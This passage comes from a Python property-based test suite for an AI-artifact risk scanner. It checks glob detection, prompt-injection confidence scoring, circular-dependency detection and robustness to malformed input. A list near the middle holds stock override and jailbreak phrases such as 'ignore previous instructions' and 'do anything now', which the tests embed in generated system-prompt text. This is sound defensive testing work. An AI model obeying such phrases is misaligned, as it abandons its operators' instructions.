    # Feature: scanner-false-positive-reduction, Property 4: Genuine glob pattern detection preserved

    **Validates: Requirements 2.3, 7.2**

    For any asterisk or double-asterisk appearing after a path separator
    (e.g., `/etc/*`, `/tmp/**`), the PermAudit scanner SHALL produce at least
    one ScanFinding with unchanged confidence.
    """

    @given(content=glob_pattern_paths())
    @settings(max_examples=100, deadline=None)
    def test_glob_pattern_after_path_separator_produces_finding(self, content: str) -> None:
        """Genuine glob patterns with asterisks after path separators
        produce at least one ScanFinding from the PermAudit scanner."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.perm_audit import PermAuditScanner

        scanner = PermAuditScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.SKILL,
            artifact_path="config/permissions.yaml",
        )

        # At least one finding should be produced for the glob pattern
        assert len(findings) >= 1, (
            f"Expected at least one finding for genuine glob pattern, "
            f"but got {len(findings)} findings. "
            f"Content:\n{content}"
        )

        # Verify confidence is at expected levels (unchanged from original detection)
        for finding in findings:
            assert finding.confidence >= 0.80, (
                f"Expected confidence >= 0.80 (unchanged from original detection), "
                f"but got {finding.confidence} for finding: {finding.evidence}"
            )


# Feature: scanner-false-positive-reduction, Property 7: Documentation context reduces injection confidence below gate threshold
# Feature: scanner-false-positive-reduction, Property 8: Non-documentation injection detection confidence preserved


# --- Strategies for Properties 7 and 8 ---


_INJECTION_PHRASES: list[str] = [
    "ignore previous instructions",
    "forget all previous",
    "disregard your instructions",
    "you are now",
    "new instructions:",
    "from now on you are",
    "jailbreak",
    "do anything now",
    "unrestricted mode",
    "no restrictions",
]


@st.composite
def injection_in_documentation(draw: st.DrawFn) -> tuple[str, str]:
    """Generate security documentation content containing injection patterns.

    Returns a tuple of (artifact_content, artifact_path) where:
    - artifact_path contains "security" or "test-plan"
    - OR content has a Markdown bullet point with the injection phrase
    - OR content has a security-themed header above the injection phrase

    The content always includes documentation context markers to ensure
    the InjectionDet scanner recognizes the documentation context.
    """
    injection_phrase = draw(st.sampled_from(_INJECTION_PHRASES))

    # Choose documentation context type
    context_type = draw(st.sampled_from(["path_security", "path_test_plan", "bullet", "header"]))

    if context_type == "path_security":
        artifact_path = draw(
            st.sampled_from(
                [
                    "docs/security-review.md",
                    "security/threat-model.md",
                    "docs/security-guidelines.md",
                    "reports/security-audit.md",
                    "plans/security-testing.md",
                ]
            )
        )
        # Content can be plain text since the path provides context
        prefix = draw(
            st.sampled_from(
                [
                    "# Security Review\n\nThe following patterns are attack vectors:\n\n",
                    "## Threat Model\n\nKnown injection techniques:\n\n",
                    "# Attack Patterns\n\n",
                ]
            )
        )
        content = f"{prefix}The attacker may use: {injection_phrase}\n"

    elif context_type == "path_test_plan":
        artifact_path = draw(
            st.sampled_from(
                [
                    "tests/test-plan-injection.md",
                    "docs/test-plan-security.md",
                    "qa/test-plan.md",
                    "plans/test-plan-prompt-attacks.md",
                ]
            )
        )
        prefix = draw(
            st.sampled_from(
                [
                    "# Test Plan\n\nTest cases for injection detection:\n\n",
                    "## Test Scenarios\n\nVerify scanner catches:\n\n",
                    "# Injection Test Plan\n\n",
                ]
            )
        )
        content = f"{prefix}Case 1: {injection_phrase}\n"

    elif context_type == "bullet":
        artifact_path = draw(
            st.sampled_from(
                [
                    "docs/security-notes.md",
                    "security/attack-vectors.md",
                    "docs/security-overview.md",
                ]
            )
        )
        # Use Markdown bullet point containing the injection phrase
        prefix = draw(
            st.sampled_from(
                [
                    "# Security Considerations\n\nKnown attack patterns include:\n\n",
                    "# Threats\n\nExamples of injection attacks:\n\n",
                    "# Attack Taxonomy\n\nCommon patterns:\n\n",
                ]
            )
        )
        bullet_prefix = draw(st.sampled_from(["- ", "* ", "+ "]))
        content = f"{prefix}{bullet_prefix}{injection_phrase}\n"

    else:  # header
        artifact_path = draw(
            st.sampled_from(
                [
                    "docs/security-review.md",
                    "security/threat-model.md",
                    "docs/security-considerations.md",
                ]
            )
        )
        # Place injection phrase under a security-themed header
        header = draw(
            st.sampled_from(
                [
                    "# Security Considerations",
                    "## Threat Model",
                    "## Attack Vectors",
                    "# Security Test Cases",
                    "## Considerations for Prompt Safety",
                ]
            )
        )
        content = f"{header}\n\nThe following is a known attack: {injection_phrase}\n"

    return content, artifact_path


@st.composite
def injection_in_prompt(draw: st.DrawFn) -> tuple[str, str]:
    """Generate prompt/artifact content with injection patterns but NO documentation context.

    Returns a tuple of (artifact_content, artifact_path) where:
    - artifact_path does NOT contain "security" or "test-plan"
    - Content does NOT have Markdown bullet points or security-themed headers
    - The injection phrase appears in plain prose without documentation markers

    This represents genuine injection attempts that should be detected at full confidence.
    """
    injection_phrase = draw(st.sampled_from(_INJECTION_PHRASES))

    artifact_path = draw(
        st.sampled_from(
            [
                "prompts/assistant.md",
                "prompts/helper.md",
                "skills/task-runner.md",
                "agents/code-gen.md",
                "instructions/setup.md",
                "prompts/chatbot.md",
                "artifacts/main-prompt.txt",
            ]
        )
    )

    # Content without any documentation context markers:
    # - No bullet points (- , * , + ) at line start
    # - No security-themed headers above the injection phrase
    # - File path has no "security" or "test-plan"
    prefix = draw(
        st.sampled_from(
            [
                "You are a helpful assistant.\n\n",
                "System prompt for the agent.\n\n",
                "Instructions for the model:\n\n",
                "Role: Code generator\n\n",
                "Configuration:\n\n",
            ]
        )
    )

    # Place injection phrase in plain text (not a bullet, not under security header)
    content = f"{prefix}{injection_phrase}\n"

    return content, artifact_path


# --- Property 7 and 8 Tests ---


class TestInjectionDocumentationContext:
    """Property 7: Documentation context reduces injection confidence below gate threshold.

    # Feature: scanner-false-positive-reduction, Property 7: Documentation context reduces injection confidence below gate threshold

    **Validates: Requirements 4.1, 4.2, 4.3**

    For any injection pattern match occurring in documentation context (file path
    containing "security" or "test-plan", inside a Markdown bullet point, or under
    a security-themed header), the InjectionDet scanner SHALL assign a confidence
    score below 0.40 to the resulting ScanFinding.
    """

    @given(data=injection_in_documentation())
    @settings(max_examples=100, deadline=None)
    def test_documentation_context_reduces_confidence(self, data: tuple[str, str]) -> None:
        """Injection patterns in documentation context get confidence reduced below 0.40."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.injection_det import InjectionDetScanner

        content, artifact_path = data
        scanner = InjectionDetScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.PROMPT,
            artifact_path=artifact_path,
        )

        # Filter to findings from direct injection and jailbreak detection
        # (these are the methods that apply documentation context reduction)
        injection_findings = [f for f in findings if f.id in ("P-S1", "P-S7")]

        # All injection/jailbreak findings in documentation context should have
        # confidence below 0.40 (the gate threshold)
        for finding in injection_findings:
            assert finding.confidence < 0.40, (
                f"Finding '{finding.title}' (id={finding.id}) in documentation context "
                f"has confidence {finding.confidence}, expected < 0.40. "
                f"Path: {artifact_path}, Content:\n{content}"
            )


class TestInjectionNonDocumentationConfidence:
    """Property 8: Non-documentation injection detection confidence preserved.

    # Feature: scanner-false-positive-reduction, Property 8: Non-documentation injection detection confidence preserved

    **Validates: Requirements 4.4, 4.5, 7.4**

    For any injection pattern match occurring in content without documentation context
    markers (no security/test-plan filename, no bullet point context, no security-themed
    header), the InjectionDet scanner SHALL maintain confidence at or above the original
    detection confidence (>= 0.40).
    """

    @given(data=injection_in_prompt())
    @settings(max_examples=100, deadline=None)
    def test_non_documentation_context_preserves_confidence(self, data: tuple[str, str]) -> None:
        """Injection patterns outside documentation context maintain confidence >= 0.40."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.injection_det import InjectionDetScanner

        content, artifact_path = data
        scanner = InjectionDetScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.PROMPT,
            artifact_path=artifact_path,
        )

        # Filter to findings from direct injection and jailbreak detection
        injection_findings = [f for f in findings if f.id in ("P-S1", "P-S7")]

        # At least one finding should be produced for the injection pattern
        assert len(injection_findings) >= 1, (
            f"Expected at least one injection finding for non-documentation content, "
            f"but got {len(injection_findings)} findings. "
            f"Path: {artifact_path}, Content:\n{content}"
        )

        # All findings should maintain original confidence (>= 0.40)
        for finding in injection_findings:
            assert finding.confidence >= 0.40, (
                f"Finding '{finding.title}' (id={finding.id}) outside documentation "
                f"context has confidence {finding.confidence}, expected >= 0.40. "
                f"Path: {artifact_path}, Content:\n{content}"
            )


# ============================================================
# Feature: scanner-false-positive-reduction
# Property 11: Explicit bidirectional references detected as circular dependencies
# Property 12: Keyword self-references excluded from circular dependency detection
# ============================================================


# --- Strategies for Properties 11 and 12 ---


@st.composite
def artifact_name_part(draw: st.DrawFn) -> str:
    """Generate a valid artifact name (no path separators, 4+ chars)."""
    return draw(
        st.sampled_from(
            [
                "my-artifact",
                "feature-skill",
                "agent-config",
                "data-processor",
                "auth-handler",
                "compose-helper",
                "prompt-builder",
                "task-runner",
                "code-scanner",
                "risk-validator",
            ]
        )
    )


@st.composite
def explicit_circular_reference(draw: st.DrawFn) -> tuple[str, str, str]:
    """Generate content with an explicit path-based self-reference.

    The content contains an explicit file path reference (with `/` or `\\`
    separators) that points back to the artifact itself, using patterns
    that match the scanner's _REFERENCE_PATTERNS regexes:
    - Pattern 1: uses/requires/depends on/imports/includes + path
    - Pattern 2: skills/<name> (path-like prefix)
    - Pattern 3: ref:/reference:/source:/target:/dependency:/include: + path

    Returns:
        A tuple of (content, artifact_path, artifact_name) where content
        contains an explicit reference back to the artifact.
    """
    name = draw(artifact_name_part())
    extension = draw(st.sampled_from([".yaml", ".yml", ".md", ".json"]))
    artifact_path = f"skills/{name}{extension}"

    # Choose reference style that matches actual scanner regex patterns
    ref_style = draw(
        st.sampled_from(
            [
                "uses_path",
                "requires_path",
                "imports_path",
                "includes_path",
                "depends_on_path",
                "structured_ref",
                "structured_reference",
                "structured_dependency",
                "structured_include",
            ]
        )
    )

    # Generate some preamble text
    preamble = draw(
        st.sampled_from(
            [
                "# Artifact Configuration\n\nThis artifact handles data processing.\n\n",
                "name: my-skill\ndescription: A skill for handling tasks\n\n",
                "## Overview\n\nThis component provides utility functions.\n\n",
                "---\ntitle: Agent Config\n---\n\n",
            ]
        )
    )

    # Build the explicit self-reference line based on style.
    # All patterns use path separators to ensure explicit path matching.
    if ref_style == "uses_path":
        ref_line = f"uses skills/{name}{extension}"
    elif ref_style == "requires_path":
        ref_line = f"requires skills/{name}{extension}"
    elif ref_style == "imports_path":
        ref_line = f"imports skills/{name}{extension}"
    elif ref_style == "includes_path":
        ref_line = f"includes skills/{name}{extension}"
    elif ref_style == "depends_on_path":
        ref_line = f"depends on skills/{name}{extension}"
    elif ref_style == "structured_ref":
        ref_line = f"ref: skills/{name}{extension}"
    elif ref_style == "structured_reference":
        ref_line = f"reference: skills/{name}{extension}"
    elif ref_style == "structured_dependency":
        ref_line = f"dependency: skills/{name}{extension}"
    else:  # structured_include
        ref_line = f"include: skills/{name}{extension}"

    # Generate some suffix text
    suffix = draw(
        st.sampled_from(
            [
                "\n\n## Notes\n\nEnd of artifact.",
                "\n\nAdditional configuration follows.",
                "\n\n# Footer\nVersion 1.0",
                "",
            ]
        )
    )

    content = preamble + ref_line + suffix
    return content, artifact_path, name


@st.composite
def keyword_self_reference(draw: st.DrawFn) -> tuple[str, str, str]:
    """Generate content with only keyword self-references (no path-based refs).

    The content contains the artifact's topic or filename as a keyword but
    does NOT contain any explicit file path references (no `/` or `\\`
    separators in the reference) or structured reference fields pointing
    to itself.

    Returns:
        A tuple of (content, artifact_path, artifact_name) where content
        contains the artifact's name/topic as a keyword but no explicit
        path-based self-reference.
    """
    # Use topic-based naming where the file discusses its own topic
    topic = draw(
        st.sampled_from(
            [
                "features",
                "authentication",
                "logging",
                "validation",
                "monitoring",
                "deployment",
                "security",
                "testing",
                "performance",
                "caching",
            ]
        )
    )
    extension = draw(st.sampled_from([".yaml", ".yml", ".md"]))
    artifact_path = f"{topic}{extension}"

    # Generate content that mentions the topic keyword in prose
    # but does NOT use path separators or structured reference fields
    prose_template = draw(
        st.sampled_from(
            [
                (
                    f"# {topic.title()} Guide\n\n"
                    f"This document covers {topic} best practices.\n\n"
                    f"When working with {topic}, consider the following:\n"
                    f"- Ensure {topic} is properly configured\n"
                    f"- Monitor {topic} metrics regularly\n"
                ),
                (
                    f"## About {topic.title()}\n\n"
                    f"The {topic} module provides core functionality.\n"
                    f"All {topic} operations should be logged.\n"
                    f"Review {topic} settings before deployment.\n"
                ),
                (
                    f"name: {topic}\n"
                    f"description: Handles all {topic} operations\n"
                    f"tags:\n"
                    f"  - {topic}\n"
                    f"  - core\n"
                    f"notes: This {topic} artifact is self-contained.\n"
                ),
                (
                    f"---\ntitle: {topic.title()} Configuration\n---\n\n"
                    f"The {topic} system manages internal state.\n"
                    f"Key {topic} parameters are defined below.\n"
                ),
            ]
        )
    )

    return prose_template, artifact_path, topic


# --- Property 11 and 12 Tests ---


class TestExplicitCircularDependencyDetection:
    """Property 11: Explicit bidirectional references detected as circular dependencies.

    # Feature: scanner-false-positive-reduction, Property 11

    **Validates: Requirements 6.1, 6.4, 7.6**

    For any artifact content containing an explicit file path reference or artifact
    name reference that matches back to the artifact itself via path-based matching
    (containing `/` or `\\` separators or structured reference fields), the
    ComposeAnalyze scanner SHALL produce at least one circular dependency finding.
    """

    @given(data=explicit_circular_reference())
    @settings(max_examples=100, deadline=None)
    def test_explicit_self_reference_produces_circular_dependency_finding(
        self, data: tuple[str, str, str]
    ) -> None:
        """An explicit path-based self-reference produces at least one circular
        dependency finding from the ComposeAnalyze scanner."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.compose_analyze import ComposeAnalyzeScanner

        content, artifact_path, artifact_name = data

        scanner = ComposeAnalyzeScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.SKILL,
            artifact_path=artifact_path,
        )

        # Filter for circular dependency findings (CMP-4 or SK-P3)
        circular_dep_risk_ids = {"CMP-4", "SK-P3", "OW-P2"}
        circular_findings = [f for f in findings if f.id in circular_dep_risk_ids]

        assert len(circular_findings) >= 1, (
            f"Expected at least one circular dependency finding for explicit "
            f"self-reference in artifact '{artifact_name}' at path '{artifact_path}', "
            f"but got {len(circular_findings)}. "
            f"All findings: {[(f.id, f.description) for f in findings]}. "
            f"Content:\n{content}"
        )


class TestKeywordSelfReferenceExclusion:
    """Property 12: Keyword self-references excluded from circular dependency detection.

    # Feature: scanner-false-positive-reduction, Property 12

    **Validates: Requirements 6.2**

    For any file whose content contains its own filename or topic as a keyword
    (without an explicit file path reference containing separators or structured
    reference syntax), the ComposeAnalyze scanner SHALL produce zero circular
    dependency findings based on that keyword match alone.
    """

    @given(data=keyword_self_reference())
    @settings(max_examples=100, deadline=None)
    def test_keyword_only_self_reference_produces_no_circular_dependency_finding(
        self, data: tuple[str, str, str]
    ) -> None:
        """A keyword-only self-reference (topic word without path separators)
        produces zero circular dependency findings from the ComposeAnalyze scanner."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.compose_analyze import ComposeAnalyzeScanner

        content, artifact_path, topic = data

        scanner = ComposeAnalyzeScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.AGENT,
            artifact_path=artifact_path,
        )

        # Filter for circular dependency findings only
        circular_dep_risk_ids = {"CMP-4", "SK-P3", "OW-P2"}
        circular_findings = [f for f in findings if f.id in circular_dep_risk_ids]

        assert len(circular_findings) == 0, (
            f"Expected zero circular dependency findings for keyword-only "
            f"self-reference (topic='{topic}', path='{artifact_path}'), "
            f"but got {len(circular_findings)}: "
            f"{[(f.id, f.evidence) for f in circular_findings]}. "
            f"Content:\n{content}"
        )


# ============================================================
# Feature: scanner-false-positive-reduction
# Property 13: Scanner scan methods never raise exceptions
# ============================================================


# --- Strategies for Property 13 ---


@st.composite
def arbitrary_scan_input(draw: st.DrawFn) -> str:
    """Generate random/malformed content for robustness testing.

    Produces a wide variety of inputs including:
    - Empty strings
    - Binary-like content (random bytes decoded)
    - Extremely long strings (up to 10000 chars)
    - Strings with null characters, control characters
    - Unicode content
    - Strings with only whitespace
    """
    input_type = draw(
        st.sampled_from(
            [
                "empty",
                "binary_like",
                "extremely_long",
                "null_chars",
                "control_chars",
                "unicode",
                "whitespace_only",
                "mixed_random",
            ]
        )
    )

    if input_type == "empty":
        return ""

    elif input_type == "binary_like":
        # Random bytes decoded as latin-1 (simulating binary content)
        raw_bytes = draw(st.binary(min_size=1, max_size=500))
        return raw_bytes.decode("latin-1")

    elif input_type == "extremely_long":
        # Very long strings up to 10000 chars
        base_char = draw(st.sampled_from(["a", "X", " ", "\n", "`", "*", "#", "/", "\\"]))
        length = draw(st.integers(min_value=5000, max_value=10000))
        return base_char * length

    elif input_type == "null_chars":
        # Strings containing null characters interspersed with text
        segments = draw(
            st.lists(
                st.text(min_size=1, max_size=50),
                min_size=1,
                max_size=10,
            )
        )
        return "\x00".join(segments)

    elif input_type == "control_chars":
        # Strings with various control characters
        return draw(
            st.text(
                alphabet=st.characters(
                    categories=("Cc", "L", "N", "P", "S"),
                ),
                min_size=1,
                max_size=500,
            )
        )

    elif input_type == "unicode":
        # Full unicode content (emojis, CJK, Arabic, etc.)
        return draw(
            st.text(
                alphabet=st.characters(
                    categories=("L", "N", "P", "S", "Z", "M"),
                ),
                min_size=1,
                max_size=500,
            )
        )

    elif input_type == "whitespace_only":
        # Strings containing only whitespace characters
        ws_chars = draw(
            st.text(
                alphabet=st.sampled_from([" ", "\t", "\n", "\r", "\v", "\f"]),
                min_size=1,
                max_size=200,
            )
        )
        return ws_chars

    else:
        # Mixed random text with special characters
        return draw(
            st.text(
                alphabet=st.characters(),
                min_size=0,
                max_size=1000,
            )
        )


# --- Property 13 Tests ---


class TestScannerRobustness:
    """Property 13: Scanner scan methods never raise exceptions.

    # Feature: scanner-false-positive-reduction, Property 13: Scanner scan methods never raise exceptions

    **Validates: Requirements 7.7**

    For any input content (including empty, malformed, binary-like, or extremely large
    strings), all modified scanner scan() methods SHALL return a list (possibly empty)
    without raising any exception.
    """

    @given(content=arbitrary_scan_input())
    @settings(max_examples=100, deadline=None)
    def test_code_audit_scanner_never_raises(self, content: str) -> None:
        """CodeAuditScanner.scan() returns a list without raising for any input."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.code_audit import CodeAuditScanner

        scanner = CodeAuditScanner()
        result = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.AGENT,
            artifact_path="test_artifact.md",
        )

        assert isinstance(result, list), (
            f"Expected list return from CodeAuditScanner.scan(), got {type(result).__name__}"
        )

    @given(content=arbitrary_scan_input())
    @settings(max_examples=100, deadline=None)
    def test_perm_audit_scanner_never_raises(self, content: str) -> None:
        """PermAuditScanner.scan() returns a list without raising for any input."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.perm_audit import PermAuditScanner

        scanner = PermAuditScanner()
        result = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.SKILL,
            artifact_path="test_artifact.md",
        )

        assert isinstance(result, list), (
            f"Expected list return from PermAuditScanner.scan(), got {type(result).__name__}"
        )

    @given(content=arbitrary_scan_input())
    @settings(max_examples=100, deadline=None)
    def test_injection_det_scanner_never_raises(self, content: str) -> None:
        """InjectionDetScanner.scan() returns a list without raising for any input."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.injection_det import InjectionDetScanner

        scanner = InjectionDetScanner()
        result = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.PROMPT,
            artifact_path="test_artifact.md",
        )

        assert isinstance(result, list), (
            f"Expected list return from InjectionDetScanner.scan(), got {type(result).__name__}"
        )

    @given(content=arbitrary_scan_input())
    @settings(max_examples=100, deadline=None)
    def test_compose_analyze_scanner_never_raises(self, content: str) -> None:
        """ComposeAnalyzeScanner.scan() returns a list without raising for any input."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.compose_analyze import ComposeAnalyzeScanner

        scanner = ComposeAnalyzeScanner()
        result = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.AGENT,
            artifact_path="test_artifact.md",
        )

        assert isinstance(result, list), (
            f"Expected list return from ComposeAnalyzeScanner.scan(), got {type(result).__name__}"
        )
